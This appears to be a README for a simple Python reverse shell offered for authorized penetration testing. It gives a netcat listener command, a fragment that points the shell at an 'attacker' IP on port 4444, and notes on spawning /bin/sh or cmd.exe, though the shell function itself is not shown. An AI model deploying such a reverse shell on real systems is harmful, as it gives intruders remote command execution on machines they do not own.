cyberdudebivash's reverse shell

Description

This is a simple Python-based reverse shell tool designed for ethical penetration testing (pentesting) purposes. It establishes a connection from the target machine back to an attacker's listener, allowing remote command execution. The tool uses standard Python libraries and is intended for use in controlled environments with explicit permission.

Disclaimer: This tool is for educational and authorized testing only. Unauthorized use may violate laws and ethical guidelines. Always obtain permission before running on any system. The author assumes no liability for misuse.

Features

&nbsp;	• Establishes a reverse TCP connection to a specified host and port.

&nbsp;	• Redirects stdin, stdout, and stderr to the socket for interactive shell access.

&nbsp;	• Uses /bin/sh for Unix-like systems (can be modified for Windows with cmd.exe).

&nbsp;	• Lightweight and uses only built-in Python modules—no external dependencies.

Installation

&nbsp;	1. Clone or download the script.

&nbsp;	2. No installation required, as it uses standard Python libraries.

&nbsp;	3. Ensure Python 3.x is installed on the target machine.

Usage

On the Attacker's Machine (Listener):

Run a listener using netcat (nc) or similar:



nc -lvnp <port>

Replace <port> with your chosen port (e.g., 4444).

On the Target Machine:

&nbsp;	1. Edit the script to set HOST to your attacker's IP and PORT to the listener port.

&nbsp;	2. Run the script:



python reverse\_shell.py

The target will connect back, providing a shell prompt on the listener.



if \_\_name\_\_ == "\_\_main\_\_":

&nbsp;   HOST = "192.168.1.100"  # Attacker's IP

&nbsp;   PORT = 4444             # Listener port

&nbsp;   reverse\_shell(HOST, PORT)

Limitations

&nbsp;	• Works primarily on Unix-like systems; for Windows, modify the subprocess call to \["cmd.exe"].

&nbsp;	• No encryption or obfuscation—use in testing only.

&nbsp;	• Firewall or antivirus may block connections; test in isolated environments.

&nbsp;	• Not persistent; connection closes if script stops.

Contributing

Feel free to fork and submit pull requests for improvements, such as adding encryption or cross-platform support.

License

MIT License - Free to use and modify for ethical purposes.



Author



BIVASH NAYAK



Copyright

copyright@cyberdudebivash  2025

